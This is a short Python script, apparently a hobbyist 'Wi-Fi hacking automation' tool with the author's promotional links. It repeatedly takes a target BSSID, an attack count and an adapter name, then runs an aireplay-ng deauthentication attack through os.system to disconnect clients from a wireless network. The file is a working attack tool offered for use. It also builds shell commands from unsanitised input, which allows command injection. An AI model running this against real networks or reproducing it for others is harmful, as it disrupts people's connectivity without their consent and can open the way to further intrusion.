import os

print("Developed by Yatharth")
print("Wi-Fi hacking Automation Program")
print(" ")
print("follow on instagram @im.yatharth")
print("Visit Github:-  https://github.com/yatharthgeek/")
print("Subscribe YouTube Channel :- https://www.youtube.com/channel/UC6AXassf_ZGu-icFW8iT0-Q")
print(" \n"+"")

print("[#]Use this file for Deauthentication of the client from the network[#]")
print(" \n"+"")

while 1==1:

    bssid= input("[target BSSID] >>")
    attack= input("[No of attacks] >>")
    infn=input("[WiFi adpater Name] >> ")

    code1="aireplay-ng --deauth "+attack+" -a "+bssid+" "+infn+"mon"
    os.system(code1)